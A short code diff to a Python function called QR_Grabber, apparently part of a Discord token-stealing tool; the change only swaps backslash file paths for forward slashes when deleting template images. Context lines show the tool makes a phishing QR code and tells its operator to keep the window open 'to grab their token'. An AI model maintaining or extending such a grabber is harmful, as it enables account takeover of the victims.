@@ -112,9 +112,9 @@ def QR_Grabber(Webhook):
     paste_template()
 
     #remove the templates
-    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
-    os.remove(os.getcwd()+"\\QR-Code\\template.png")
-    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")
+    os.remove(os.getcwd()+"/QR-Code/overlay.png")
+    os.remove(os.getcwd()+"/QR-Code/template.png")
+    os.remove(os.getcwd()+"/QR-Code/temp_qr_code.png")
 
     print(f'\nQR Code generated in '+os.getcwd()+"\\QR-Code")
     print(f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
